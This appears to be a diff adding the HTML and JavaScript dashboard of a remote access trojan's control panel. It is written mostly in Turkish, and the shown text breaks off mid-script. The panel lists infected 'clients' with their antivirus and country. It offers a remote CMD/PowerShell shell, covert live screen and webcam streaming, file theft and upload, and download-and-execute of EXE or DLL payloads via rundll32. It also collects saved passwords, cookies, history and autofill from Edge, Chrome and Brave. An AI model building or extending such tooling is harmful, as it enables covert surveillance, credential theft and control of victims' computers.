@@ -1,0 +1,2172 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard</title>
+    <link rel="stylesheet" href="/css/dashboard.css">
+</head>
+<body>
+    <div class="layout">
+
+        <!-- ─── Sol Sidebar ─── -->
+        <aside class="sidebar" id="sidebar">
+            <div class="sidebar-logo">
+                <span class="logo-icon">◈</span>
+                <span class="logo-text">Panel</span>
+            </div>
+
+            <nav class="sidebar-nav">
+                <button class="nav-item active" onclick="switchPage('home')" id="nav-home">
+                    <span class="nav-icon">⌂</span>
+                    <span class="nav-label">Home</span>
+                </button>
+                <button class="nav-item" onclick="switchPage('clients')" id="nav-clients">
+                    <span class="nav-icon">◉</span>
+                    <span class="nav-label">Clients</span>
+                    <span class="nav-badge" id="nav-badge">0</span>
+                </button>
+                <button class="nav-item" onclick="switchPage('builder')" id="nav-builder">
+                    <span class="nav-icon">⚙</span>
+                    <span class="nav-label">Builder</span>
+                </button>
+                <button class="nav-item" onclick="switchPage('settings')" id="nav-settings">
+                    <span class="nav-icon">◈</span>
+                    <span class="nav-label">Settings</span>
+                </button>
+                <button class="nav-item" onclick="switchPage('account')" id="nav-account">
+                    <span class="nav-icon">◎</span>
+                    <span class="nav-label">Account</span>
+                </button>
+            </nav>
+
+            <div class="sidebar-bottom">
+                <a href="/logout" class="logout-item">
+                    <span class="nav-icon">⏻</span>
+                    <span class="nav-label">Çıkış</span>
+                </a>
+            </div>
+        </aside>
+
+        <!-- ─── Mobil Header ─── -->
+        <div class="mobile-header">
+            <button class="hamburger" onclick="toggleSidebar()" id="hamburger">☰</button>
+            <span class="mobile-title" id="mobile-title">Home</span>
+            <a href="/logout" class="mobile-logout">⏻</a>
+        </div>
+
+        <!-- ─── Sidebar Overlay (mobil) ─── -->
+        <div class="sidebar-overlay" id="sidebar-overlay" onclick="closeSidebar()"></div>
+
+        <!-- ─── Ana İçerik ─── -->
+        <main class="main-content">
+
+            <!-- ══════════ HOME ══════════ -->
+            <div class="page" id="page-home">
+                <div class="page-header">
+                    <h2>Home</h2>
+                    <span class="page-sub">Sistem durumu ve genel bakış</span>
+                </div>
+
+                <!-- Stat kartları -->
+                <div class="stat-grid">
+                    <div class="stat-card accent-blue">
+                        <div class="stat-icon">◉</div>
+                        <div class="stat-info">
+                            <div class="stat-value" id="stat-clients">0</div>
+                            <div class="stat-label">Aktif Client</div>
+                        </div>
+                    </div>
+                    <div class="stat-card accent-green">
+                        <div class="stat-icon">⏱</div>
+                        <div class="stat-info">
+                            <div class="stat-value mono" id="stat-uptime">00:00:00</div>
+                            <div class="stat-label">Uptime</div>
+                        </div>
+                    </div>
+                    <div class="stat-card accent-purple">
+                        <div class="stat-icon">⚡</div>
+                        <div class="stat-info">
+                            <div class="stat-value" id="stat-goroutines">0</div>
+                            <div class="stat-label">Goroutine</div>
+                        </div>
+                    </div>
+                    <div class="stat-card accent-orange">
+                        <div class="stat-icon">▣</div>
+                        <div class="stat-info">
+                            <div class="stat-value" id="stat-mem">0 MB</div>
+                            <div class="stat-label">RAM Kullanımı</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Server bilgileri -->
+                <div class="info-grid">
+                    <div class="info-card">
+                        <div class="info-card-title">Server Bilgileri</div>
+                        <div class="info-rows">
+                            <div class="info-row">
+                                <span class="info-key">İşletim Sistemi</span>
+                                <span class="info-val mono" id="info-os">—</span>
+                            </div>
+                            <div class="info-row">
+                                <span class="info-key">Mimari</span>
+                                <span class="info-val mono" id="info-arch">—</span>
+                            </div>
+                            <div class="info-row">
+                                <span class="info-key">Go Versiyonu</span>
+                                <span class="info-val mono" id="info-go">—</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="info-card">
+                        <div class="info-card-title">Ağ Bilgileri</div>
+                        <div class="info-rows">
+                            <div class="info-row">
+                                <span class="info-key">HTTP Port</span>
+                                <span class="info-val mono" id="info-http">—</span>
+                            </div>
+                            <div class="info-row">
+                                <span class="info-key">TCP Port</span>
+                                <span class="info-val mono" id="info-tcp">—</span>
+                            </div>
+                            <div class="info-row">
+                                <span class="info-key">Durum</span>
+                                <span class="info-val">
+                                    <span class="status-dot"></span> Çalışıyor
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Bağlı clientler mini liste -->
+                <div class="info-card" style="margin-top:16px;">
+                    <div class="info-card-title" style="display:flex;justify-content:space-between;align-items:center;">
+                        <span>Son Bağlanan Clientler</span>
+                        <button class="mini-btn" onclick="switchPage('clients')">Tümünü Gör →</button>
+                    </div>
+                    <div id="home-client-list" class="home-client-list">
+                        <div class="empty-mini">Henüz bağlı client yok.</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ══════════ CLIENTS ══════════ -->
+            <div class="page" id="page-clients" style="display:none;">
+                <div class="clients-layout">
+                    <!-- Sol: Liste -->
+                    <div class="client-panel" id="client-panel">
+                        <div class="section-header">
+                            <h2>Clients</h2>
+                            <span class="badge" id="count">{{.Count}}</span>
+                        </div>
+                        <div class="client-list" id="client-list">
+                            {{if .Clients}}
+                                {{range .Clients}}
+                                <div class="client-row" onclick="selectClient(this, '{{.ID}}', '{{.IP}}', '{{.ConnectedAt}}', '{{.WinVersion}}', '{{.DesktopName}}', '{{.AntiVirus}}', '{{.Country}}')">
+                                    <span class="dot"></span>
+                                    <div class="client-info">
+                                        <div class="client-top">
+                                            <span class="ip">{{.IP}}</span>
+                                            {{if .Country}}<span class="country-badge">{{.Country}}</span>{{end}}
+                                        </div>
+                                        {{if .WinVersion}}
+                                        <span class="win-version">{{.WinVersion}}</span>
+                                        {{end}}
+                                        <span class="meta">
+                                            <span class="client-id">#{{.ID}}</span>
+                                            {{if .DesktopName}}<span class="desktop-name">{{.DesktopName}}</span>{{end}}
+                                            <span class="time">{{.ConnectedAt}}</span>
+                                        </span>
+                                    </div>
+                                    <span class="arrow">›</span>
+                                </div>
+                                {{end}}
+                            {{else}}
+                                <div class="empty">Henüz bağlı client yok.</div>
+                            {{end}}
+                        </div>
+                    </div>
+
+                    <!-- Sağ: Detay -->
+                    <div class="detail-panel" id="detail-panel">
+                        <div class="detail-empty" id="detail-empty">
+                            <span>←</span>
+                            <p>Bir client seçin</p>
+                        </div>
+
+                        <div class="detail-content" id="detail-content" style="display:none;">
+                            <div class="detail-header">
+                                <button class="back-btn" id="back-btn" onclick="closeDetail()">‹ Geri</button>
+                                <div class="detail-info">
+                                    <div class="detail-top">
+                                        <div class="detail-ip" id="detail-ip"></div>
+                                        <span class="detail-country" id="detail-country"></span>
+                                    </div>
+                                    <div class="detail-win" id="detail-win"></div>
+                                    <div class="detail-meta">
+                                        <span class="detail-id" id="detail-id"></span>
+                                        <span class="detail-desktop" id="detail-desktop"></span>
+                                        <span class="detail-av" id="detail-av"></span>
+                                        <span class="detail-time" id="detail-time"></span>
+                                    </div>
+                                </div>
+                                <button class="close-btn" onclick="closeDetail()">✕</button>
+                            </div>
+
+                            <div class="tab-bar">
+                                <button class="tab-btn active" id="tab-msg" onclick="switchTab('msg')">Message</button>
+                                <div class="tab-dropdown">
+                                    <button class="tab-btn" id="tab-shell" onclick="toggleShellMenu()">
+                                        Shell <span class="chevron">▾</span>
+                                    </button>
+                                    <div class="shell-menu" id="shell-menu">
+                                        <button onclick="openShell('cmd')">CMD</button>
+                                        <button onclick="openShell('ps')">PowerShell</button>
+                                    </div>
+                                </div>
+                                <button class="tab-btn" id="tab-screen" onclick="switchTab('screen')">
+                                    <span class="stream-dot" id="screen-dot"></span>
+                                    Live Screen
+                                </button>
+                                <button class="tab-btn" id="tab-cam" onclick="switchTab('cam')">
+                                    <span class="stream-dot cam" id="cam-dot"></span>
+                                    Live Camera
+                                </button>
+                                <button class="tab-btn" id="tab-tasks" onclick="switchTab('tasks')">
+                                    <span class="tab-icon">⚡</span>
+                                    Tasks
+                                </button>
+                                <button class="tab-btn" id="tab-files" onclick="switchTab('files')">
+                                    <span class="tab-icon">◫</span>
+                                    Files
+                                </button>
+                                <button class="tab-btn" id="tab-rfe" onclick="switchTab('rfe')">
+                                    <span class="tab-icon">⚡</span>
+                                    Remote Exec
+                                </button>
+                                <div class="tab-dropdown">
+                                    <button class="tab-btn" id="tab-browse" onclick="toggleBrowseMenu()">
+                                        <span class="tab-icon">◈</span>
+                                        Browse Data <span class="chevron">▾</span>
+                                    </button>
+                                    <div class="browse-menu" id="browse-menu">
+                                        <button onclick="openBrowseData('browser')">Browser</button>
+                                        <button onclick="openBrowseData('social')">Social</button>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Message -->
+                            <div class="tab-content" id="content-msg">
+                                <div class="action-card">
+                                    <div class="action-title">Send Message</div>
+                                    <div class="action-body">
+                                        <input type="text" id="msg-input" placeholder="Mesajınızı girin..." />
+                                        <button class="send-btn" onclick="sendMessage()">Gönder</button>
+                                    </div>
+                                    <div class="action-status" id="msg-status"></div>
+                                </div>
+                            </div>
+
+                            <!-- Live Screen -->
+                            <div class="tab-content" id="content-screen" style="display:none;">
+                                <div class="screen-wrapper">
+                                    <div class="screen-toolbar">
+                                        <div class="screen-info">
+                                            <span class="screen-status-label" id="screen-status-label">Durduruldu</span>
+                                        </div>
+                                        <div class="screen-fps-control">
+                                            <span class="fps-label">FPS</span>
+                                            <input type="range" id="fps-slider" class="fps-slider"
+                                                   min="1" max="30" value="10" step="1"
+                                                   oninput="onFpsChange(this.value)" />
+                                            <span class="fps-value" id="fps-value">10</span>
+                                        </div>
+                                        <div class="screen-controls">
+                                            <button class="screen-start-btn" id="screen-start-btn" onclick="screenStart()">▶ Başlat</button>
+                                            <button class="screen-stop-btn" id="screen-stop-btn" onclick="screenStop()" style="display:none;">■ Durdur</button>
+                                        </div>
+                                    </div>
+                                    <div class="screen-view" id="screen-view">
+                                        <div class="screen-placeholder" id="screen-placeholder">
+                                            <span class="screen-placeholder-icon">▣</span>
+                                            <span>Yayın başlatmak için ▶ Başlat'a basın</span>
+                                        </div>
+                                        <img id="screen-img" class="screen-img" src="" alt="" style="display:none;" />
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Live Camera -->
+                            <div class="tab-content" id="content-cam" style="display:none;">
+                                <div class="screen-wrapper">
+                                    <div class="screen-toolbar">
+                                        <div class="screen-info">
+                                            <span class="screen-status-label" id="cam-status-label">Durduruldu</span>
+                                        </div>
+                                        <div class="screen-fps-control">
+                                            <span class="fps-label">FPS</span>
+                                            <input type="range" id="cam-fps-slider" class="fps-slider"
+                                                   min="1" max="30" value="10" step="1"
+                                                   oninput="onCamFpsChange(this.value)" />
+                                            <span class="fps-value" id="cam-fps-value">10</span>
+                                        </div>
+                                        <div class="screen-controls">
+                                            <button class="screen-start-btn cam-start-btn" id="cam-start-btn" onclick="camStart()">▶ Başlat</button>
+                                            <button class="screen-stop-btn" id="cam-stop-btn" onclick="camStop()" style="display:none;">■ Durdur</button>
+                                        </div>
+                                    </div>
+                                    <div class="screen-view" id="cam-view">
+                                        <div class="screen-placeholder" id="cam-placeholder">
+                                            <span class="screen-placeholder-icon">◉</span>
+                                            <span>Kamerayı başlatmak için ▶ Başlat'a basın</span>
+                                        </div>
+                                        <img id="cam-img" class="screen-img" src="" alt="" style="display:none;" />
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Shell -->
+                            <div class="tab-content" id="content-shell" style="display:none;">
+                                <div class="terminal-wrapper">
+                                    <div class="terminal-titlebar">
+                                        <span class="terminal-type-label" id="terminal-label">CMD</span>
+                                        <button class="clear-btn" onclick="clearTerminal()">Temizle</button>
+                                    </div>
+                                    <div class="terminal-output" id="terminal-output"></div>
+                                    <div class="terminal-resize-handle" id="terminal-resize-handle" title="Sürükleyerek boyutlandır">
+                                        <span>⠿</span>
+                                    </div>
+                                    <!-- Masaüstü input -->
+                                    <div class="terminal-input-row" id="terminal-input-row">
+                                        <span class="prompt" id="term-prompt">C:\&gt;</span>
+                                        <input type="text" id="shell-input" class="terminal-input"
+                                               placeholder="komut girin..." autocomplete="off" spellcheck="false"
+                                               inputmode="none" />
+                                        <button class="term-send-btn" onclick="sendShellCommand()">↵</button>
+                                    </div>
+                                    <!-- Mobil klavye -->
+                                    <div class="mobile-keyboard" id="mobile-keyboard" style="display:none;">
+                                        <div class="mkb-input-row">
+                                            <input type="text" id="mobile-shell-input" class="mkb-input"
+                                                   placeholder="komut girin..." autocomplete="off" spellcheck="false" />
+                                            <button class="mkb-send-btn" onclick="sendMobileShellCommand()">↵</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Task Manager -->
+                            <div class="tab-content" id="content-tasks" style="display:none;">
+                                <div class="taskmgr-wrapper">
+                                    <div class="taskmgr-toolbar">
+                                        <div class="taskmgr-info">
+                                            <span class="taskmgr-count" id="task-count">— process</span>
+                                        </div>
+                                        <div class="taskmgr-search-wrap">
+                                            <input type="text" id="task-search" class="taskmgr-search"
+                                                   placeholder="Process ara..." oninput="filterTasks()" autocomplete="off" />
+                                        </div>
+                                        <button class="taskmgr-refresh-btn" id="task-refresh-btn" onclick="loadTasks()">
+                                            ↻ Yenile
+                                        </button>
+                                    </div>
+                                    <div class="taskmgr-table-wrap" id="taskmgr-table-wrap">
+                                        <div class="taskmgr-empty" id="task-empty">
+                                            <span class="taskmgr-empty-icon">⚡</span>
+                                            <span>Yüklemek için ↻ Yenile'ye basın</span>
+                                        </div>
+                                        <table class="taskmgr-table" id="taskmgr-table" style="display:none;">
+                                            <thead>
+                                                <tr>
+                                                    <th class="col-pid" onclick="sortTasks('pid')">PID <span class="sort-arrow" id="sort-pid"></span></th>
+                                                    <th class="col-name" onclick="sortTasks('name')">Process Adı <span class="sort-arrow" id="sort-name"></span></th>
+                                                    <th class="col-cpu" onclick="sortTasks('cpu')">CPU % <span class="sort-arrow" id="sort-cpu"></span></th>
+                                                    <th class="col-mem" onclick="sortTasks('mem')">RAM (MB) <span class="sort-arrow" id="sort-mem"></span></th>
+                                                    <th class="col-kill"></th>
+                                                </tr>
+                                            </thead>
+                                            <tbody id="task-tbody"></tbody>
+                                        </table>
+                                    </div>
+                                    <div class="taskmgr-statusbar" id="taskmgr-statusbar"></div>
+                                </div>
+                            </div>
+
+                            <!-- File Browser -->
+                            <div class="tab-content" id="content-files" style="display:none;">
+                                <div class="fb-wrapper">
+                                    <!-- Toolbar -->
+                                    <div class="fb-toolbar">
+                                        <button class="fb-btn fb-back-btn" id="fb-back-btn" onclick="fbGoBack()" title="Geri" disabled>‹</button>
+                                        <button class="fb-btn fb-up-btn"   id="fb-up-btn"   onclick="fbGoUp()"   title="Üst Dizin" disabled>↑</button>
+                                        <div class="fb-breadcrumb" id="fb-breadcrumb"></div>
+                                        <button class="fb-btn fb-refresh-btn" onclick="fbRefresh()" title="Yenile">↻</button>
+                                        <button class="fb-btn fb-mkdir-btn"   onclick="fbMkdirPrompt()" title="Yeni Klasör">+ Klasör</button>
+                                        <label  class="fb-btn fb-upload-btn"  title="Dosya Yükle">
+                                            ↑ Yükle
+                                            <input type="file" id="fb-upload-input" multiple style="display:none;" onchange="fbUploadFiles(this)" />
+                                        </label>
+                                    </div>
+                                    <!-- Dosya listesi -->
+                                    <div class="fb-list-wrap" id="fb-list-wrap">
+                                        <div class="fb-empty" id="fb-empty">
+                                            <span class="fb-empty-icon">◫</span>
+                                            <span>Dizin seçilmedi</span>
+                                        </div>
+                                        <table class="fb-table" id="fb-table" style="display:none;">
+                                            <thead>
+                                                <tr>
+                                                    <th class="fb-col-icon"></th>
+                                                    <th class="fb-col-name"  onclick="fbSort('name')">Ad <span class="sort-arrow" id="fb-sort-name"></span></th>
+                                                    <th class="fb-col-size"  onclick="fbSort('size')">Boyut <span class="sort-arrow" id="fb-sort-size"></span></th>
+                                                    <th class="fb-col-mtime" onclick="fbSort('mtime')">Tarih <span class="sort-arrow" id="fb-sort-mtime"></span></th>
+                                                    <th class="fb-col-act"></th>
+                                                </tr>
+                                            </thead>
+                                            <tbody id="fb-tbody"></tbody>
+                                        </table>
+                                    </div>
+                                    <!-- Status bar -->
+                                    <div class="fb-statusbar" id="fb-statusbar"></div>
+                                </div>
+                                <!-- Context Menu -->
+                                <div class="fb-ctx-menu" id="fb-ctx-menu">
+                                    <button id="fb-ctx-btn-open"     onclick="fbCtxOpen()">↳ Aç / Gir</button>
+                                    <button id="fb-ctx-btn-download" onclick="fbCtxDownload()">↓ İndir</button>
+                                    <button onclick="fbCtxRename()">✎ Yeniden Adlandır</button>
+                                    <div class="fb-ctx-sep"></div>
+                                    <button class="danger" onclick="fbCtxDelete()">✕ Sil</button>
+                                </div>
+                            </div>
+                            <!-- Remote File Execution -->
+                            <div class="tab-content" id="content-rfe" style="display:none;">
+                                <div class="rfe-wrapper">
+                                    <!-- Toolbar -->
+                                    <div class="rfe-toolbar">
+                                        <span class="rfe-toolbar-title">Remote File Execution</span>
+                                        <div class="rfe-type-toggle">
+                                            <button class="rfe-type-btn active" id="rfe-btn-exe" onclick="rfeSetType('exe')">EXE</button>
+                                            <button class="rfe-type-btn" id="rfe-btn-dll" onclick="rfeSetType('dll')">DLL</button>
+                                        </div>
+                                    </div>
+
+                                    <!-- Body -->
+                                    <div class="rfe-body">
+                                        <!-- Form Card -->
+                                        <div class="rfe-card">
+                                            <div class="rfe-card-head">
+                                                <span class="rfe-card-icon">◈</span>
+                                                <span class="rfe-card-title" id="rfe-card-title">Execute EXE</span>
+                                            </div>
+                                            <div class="rfe-card-body">
+                                                <!-- URL -->
+                                                <div class="rfe-row">
+                                                    <label class="rfe-label">Dosya URL</label>
+                                                    <div class="rfe-input-wrap">
+                                                        <span class="rfe-prefix" id="rfe-prefix">http://</span>
+                                                        <input type="text" id="rfe-url" class="rfe-input"
+                                                               placeholder="example.com/payload.exe"
+                                                               autocomplete="off" spellcheck="false" />
+                                                    </div>
+                                                    <span class="rfe-hint">İndirilecek ve çalıştırılacak dosyanın tam URL'i</span>
+                                                </div>
+
+                                                <!-- Args (EXE only) -->
+                                                <div class="rfe-row" id="rfe-args-row">
+                                                    <label class="rfe-label">Argümanlar <span class="rfe-label-opt">(opsiyonel)</span></label>
+                                                    <div class="rfe-input-wrap">
+                                                        <span class="rfe-prefix">args</span>
+                                                        <input type="text" id="rfe-args" class="rfe-input"
+                                                               placeholder="/silent /install"
+                                                               autocomplete="off" spellcheck="false" />
+                                                    </div>
+                                                    <span class="rfe-hint">EXE'ye geçirilecek komut satırı parametreleri</span>
+                                                </div>
+
+                                                <!-- DLL Note -->
+                                                <div class="rfe-dll-note" id="rfe-dll-note" style="display:none;">
+                                                    <span class="rfe-dll-note-icon">◉</span>
+                                                    <span>DLL, hedef sistemde <code>rundll32</code> aracılığıyla yüklenecek. Export fonksiyon belirtilmezse varsayılan giriş noktası kullanılır.</span>
+                                                </div>
+
+                                                <button class="rfe-run-btn" id="rfe-run-btn" onclick="rfeExecute()">
+                                                    <span id="rfe-btn-text">▶ Çalıştır</span>
+                                                </button>
+                                            </div>
+                                        </div>
+
+                                        <!-- Result Card -->
+                                        <div class="rfe-result-card" id="rfe-result-card" style="display:none;">
+                                            <div class="rfe-result-head">
+                                                <span class="rfe-result-label">Sonuç</span>
+                                                <button class="rfe-clear-btn" onclick="rfeClear()">✕ Temizle</button>
+                                            </div>
+                                            <div class="rfe-result-body" id="rfe-result-body">
+                                                <span class="rfe-result-icon" id="rfe-result-icon"></span>
+                                                <span id="rfe-result-text"></span>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Status Bar -->
+                                    <div class="rfe-statusbar" id="rfe-statusbar">Hazır</div>
+                                </div>
+                            </div>
+
+                            <!-- Browse Data: Browser -->
+                            <div class="tab-content" id="content-browse-browser" style="display:none;">
+                                <div class="browse-wrapper">
+                                    <div class="browse-toolbar">
+                                        <span class="browse-toolbar-title">Browser Data</span>
+                                    </div>
+                                    <div class="browse-body">
+                                        <!-- Edge -->
+                                        <div class="browser-stat-card">
+                                            <div class="browser-stat-header">
+                                                <span class="browser-stat-icon edge">⬡</span>
+                                                <span class="browser-stat-name">Edge</span>
+                                            </div>
+                                            <div class="browser-stat-rows">
+                                                <div class="browser-stat-row">
+                                                    <span class="browser-stat-key">Kayıtlı Şifreler:</span>
+                                                    <span class="browser-stat-val" id="edge-passwords">—</span>
+                                                </div>
+                                                <div class="browser-stat-row">
+                                                    <span class="browser-stat-key">Kayıtlı Çerezler:</span>
+                                                    <span class="browser-stat-val" id="edge-cookies">—</span>
+                                                </div>
+                                                <div class="browser-stat-row">
+                                                    <span class="browser-stat-key">Kayıtlı Geçmiş:</span>
+                                                    <span class="browser-stat-val" id="edge-history">—</span>
+                                                </div>
+                                                <div class="browser-stat-row">
+                                                    <span class="browser-stat-key">Kayıtlı Autofill:</span>
+                                                    <span class="browser-stat-val" id="edge-autofill">—</span>
+                                                </div>
+                                            </div>
+                                            <div class="browser-stat-footer">
+                                                <button class="collect-data-btn" id="collect-btn-edge" onclick="collectBrowserData('edge')">⬇ Collect Data</button>
+                                                <span class="collect-status" id="collect-status-edge"></span>
+                                            </div>
+                                        </div>
+                                        <!-- Chrome -->
+                                        <div class="browser-stat-card">
+                                            <div class="browser-stat-header">
+                                                <span class="browser-stat-icon chrome">◉</span>
+                                                <span class="browser-stat-name">Chrome</span>
+                                            </div>
+                                            <div class="browser-stat-rows">
+                                                <div class="browser-stat-row">
+                                                    <span class="browser-stat-key">Kayıtlı Şifreler:</span>
+                                                    <span class="browser-stat-val" id="chrome-passwords">—</span>
+                                                </div>
+                                                <div class="browser-stat-row">
+                                                    <span class="browser-stat-key">Kayıtlı Çerezler:</span>
+                                                    <span class="browser-stat-val" id="chrome-cookies">—</span>
+                                                </div>
+                                                <div class="browser-stat-row">
+                                                    <span class="browser-stat-key">Kayıtlı Geçmiş:</span>
+                                                    <span class="browser-stat-val" id="chrome-history">—</span>
+                                                </div>
+                                                <div class="browser-stat-row">
+                                                    <span class="browser-stat-key">Kayıtlı Autofill:</span>
+                                                    <span class="browser-stat-val" id="chrome-autofill">—</span>
+                                                </div>
+                                            </div>
+                                            <div class="browser-stat-footer">
+                                                <button class="collect-data-btn" id="collect-btn-chrome" onclick="collectBrowserData('chrome')">⬇ Collect Data</button>
+                                                <span class="collect-status" id="collect-status-chrome"></span>
+                                            </div>
+                                        </div>
+                                        <!-- Brave -->
+                                        <div class="browser-stat-card">
+                                            <div class="browser-stat-header">
+                                                <span class="browser-stat-icon brave">◈</span>
+                                                <span class="browser-stat-name">Brave</span>
+                                            </div>
+                                            <div class="browser-stat-rows">
+                                                <div class="browser-stat-row">
+                                                    <span class="browser-stat-key">Kayıtlı Şifreler:</span>
+                                                    <span class="browser-stat-val" id="brave-passwords">—</span>
+                                                </div>
+                                                <div class="browser-stat-row">
+                                                    <span class="browser-stat-key">Kayıtlı Çerezler:</span>
+                                                    <span class="browser-stat-val" id="brave-cookies">—</span>
+                                                </div>
+                                                <div class="browser-stat-row">
+                                                    <span class="browser-stat-key">Kayıtlı Geçmiş:</span>
+                                                    <span class="browser-stat-val" id="brave-history">—</span>
+                                                </div>
+                                                <div class="browser-stat-row">
+                                                    <span class="browser-stat-key">Kayıtlı Autofill:</span>
+                                                    <span class="browser-stat-val" id="brave-autofill">—</span>
+                                                </div>
+                                            </div>
+                                            <div class="browser-stat-footer">
+                                                <button class="collect-data-btn" id="collect-btn-brave" onclick="collectBrowserData('brave')">⬇ Collect Data</button>
+                                                <span class="collect-status" id="collect-status-brave"></span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="browse-statusbar" id="browse-browser-statusbar">Hazır</div>
+                                </div>
+                            </div>
+
+                            <!-- Browse Data: Social -->
+                            <div class="tab-content" id="content-browse-social" style="display:none;">
+                                <div class="browse-wrapper">
+                                    <div class="browse-toolbar">
+                                        <span class="browse-toolbar-title">Social Data</span>
+                                    </div>
+                                    <div class="browse-body">
+                                        <div class="browse-empty">
+                                            <span class="browse-empty-icon">◉</span>
+                                            <span>Yakında eklenecek</span>
+                                        </div>
+                                    </div>
+                                    <div class="browse-statusbar" id="browse-social-statusbar">Hazır</div>
+                                </div>
+                            </div>
+
+            <div class="page" id="page-builder" style="display:none;">
+                <div class="page-header">
+                    <h2>Builder</h2>
+                    <span class="page-sub">Yakında eklenecek</span>
+                </div>
+                <div class="coming-soon">
+                    <div class="coming-icon">⚙</div>
+                    <div class="coming-title">Yapım Aşamasında</div>
+                    <div class="coming-sub">Builder özelliği yakında burada olacak.</div>
+                </div>
+            </div>
+
+            <!-- ══════════ SETTINGS ══════════ -->
+            <div class="page" id="page-settings" style="display:none;">
+                <div class="page-header">
+                    <h2>Settings</h2>
+                    <span class="page-sub">Sunucu ayarları</span>
+                </div>
+
+                <div class="settings-grid">
+                    <!-- TCP Port Kartı -->
+                    <div class="info-card settings-card">
+                        <div class="info-card-title">
+                            <span class="settings-card-icon">◉</span>
+                            TCP Port (Client Bağlantı Portu)
+                        </div>
+                        <div class="settings-desc">Client'ların bağlandığı TCP soket portu. Değişiklik anında aktif olur, mevcut bağlantılar kesilmez.</div>
+                        <div class="settings-field">
+                            <label class="settings-label">Port Numarası</label>
+                            <div class="settings-input-row">
+                                <input type="number" id="settings-tcp-port" class="settings-input" min="1" max="65535" placeholder="4444" />
+                                <button class="settings-save-btn" onclick="saveSettings('tcp')">Kaydet</button>
+                            </div>
+                            <div class="settings-hint">Mevcut: <span class="mono" id="settings-tcp-current">—</span></div>
+                        </div>
+                        <div class="settings-status" id="settings-tcp-status"></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ══════════ ACCOUNT ══════════ -->
+            <div class="page" id="page-account" style="display:none;">
+                <div class="page-header">
+                    <h2>Account</h2>
+                    <span class="page-sub">Hesap bilgileri</span>
+                </div>
+                <div class="coming-soon">
+                    <div class="coming-icon">◎</div>
+                    <div class="coming-title">Yapım Aşamasında</div>
+                    <div class="coming-sub">Hesap yönetimi özelliği yakında eklenecek.</div>
+                </div>
+            </div>
+
+        </main>
+    </div>
+
+    <script>
+        // ─── Sayfa Geçişi ────────────────────────────────
+        const pages = ['home', 'clients', 'builder', 'settings', 'account'];
+        const pageTitles = { home: 'Home', clients: 'Clients', builder: 'Builder', settings: 'Settings', account: 'Account' };
+
+        function switchPage(page) {
+            pages.forEach(p => {
+                document.getElementById('page-' + p).style.display = p === page ? (p === 'clients' ? 'flex' : 'block') : 'none';
+                document.getElementById('nav-' + p).classList.toggle('active', p === page);
+            });
+            document.getElementById('mobile-title').textContent = pageTitles[page];
+
+            if (page === 'home') startStatsPolling();
+            else stopStatsPolling();
+
+            if (page === 'settings') loadSettings();
+
+            if (page !== 'clients') {
+                stopOutputPoll();
+                if (typeof isScreening !== 'undefined' && isScreening) screenStop(); else stopScreenPoll();
+                if (typeof isCaming   !== 'undefined' && isCaming)   camStop();    else stopCamPoll();
+                stopTaskAutoRefresh();
+            }
+
+            closeSidebar();
+        }
+
+        // ─── Sidebar (mobil) ────────────────────────────
+        function toggleSidebar() {
+            document.getElementById('sidebar').classList.toggle('open');
+            document.getElementById('sidebar-overlay').classList.toggle('open');
+        }
+        function closeSidebar() {
+            document.getElementById('sidebar').classList.remove('open');
+            document.getElementById('sidebar-overlay').classList.remove('open');
+        }
+
+        // ─── Settings ────────────────────────────────────
+        async function loadSettings() {
+            try {
+                const res = await fetch('/api/settings', { credentials: 'include' });
+                if (!res.ok) return;
+                const s = await res.json();
+                document.getElementById('settings-tcp-port').value = s.tcp_port || '';
+                document.getElementById('settings-tcp-current').textContent = ':' + (s.tcp_port || '—');
+            } catch (e) {}
+        }
+
+        async function saveSettings(type) {
+            const statusEl = document.getElementById('settings-' + type + '-status');
+            const inputEl  = document.getElementById('settings-' + type + '-port');
+            const val = inputEl.value.trim();
+            const port = parseInt(val, 10);
+
+            if (!val || isNaN(port) || port < 1 || port > 65535) {
+                setSettingsStatus(statusEl, 'error', 'Geçerli bir port numarası girin (1–65535).');
+                return;
+            }
+
+            setSettingsStatus(statusEl, 'loading', 'Uygulanıyor...');
+
+            try {
+                const body = {};
+                if (type === 'tcp') body.tcp_port = String(port);
+
+                const res = await fetch('/api/settings', {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(body)
+                });
+
+                if (res.ok) {
+                    document.getElementById('settings-tcp-current').textContent = ':' + port;
+                    setSettingsStatus(statusEl, 'ok', '✓ TCP port değiştirildi ve anında aktif edildi.');
+                } else {
+                    const txt = await res.text();
+                    setSettingsStatus(statusEl, 'error', 'Hata: ' + txt);
+                }
+            } catch (e) {
+                setSettingsStatus(statusEl, 'error', 'Bağlantı hatası.');
+            }
+        }
+
+        function setSettingsStatus(el, type, msg) {
+            el.textContent = msg;
+            el.className = 'settings-status';
+            if (type === 'ok')      el.classList.add('settings-status-ok');
+            if (type === 'error')   el.classList.add('settings-status-err');
+            if (type === 'loading') el.classList.add('settings-status-loading');
+        }
+
+        // ─── Home Stats ──────────────────────────────────
+        let statsInterval = null;
+
+        function startStatsPolling() {
+            fetchStats();
+            if (!statsInterval) statsInterval = setInterval(fetchStats, 3000);
+        }
+        function stopStatsPolling() {
+            if (statsInterval) { clearInterval(statsInterval); statsInterval = null; }
+        }
+
+        async function fetchStats() {
+            try {
+                const res = await fetch('/api/stats', { credentials: 'include' });
+                if (!res.ok) return;
+                const s = await res.json();
+
+                document.getElementById('stat-clients').textContent   = s.client_count;
+                document.getElementById('stat-uptime').textContent    = s.uptime;
+                document.getElementById('stat-goroutines').textContent = s.goroutines;
+                document.getElementById('stat-mem').textContent       = s.mem_alloc_mb + ' MB';
+                document.getElementById('info-os').textContent        = s.os;
+                document.getElementById('info-arch').textContent      = s.arch;
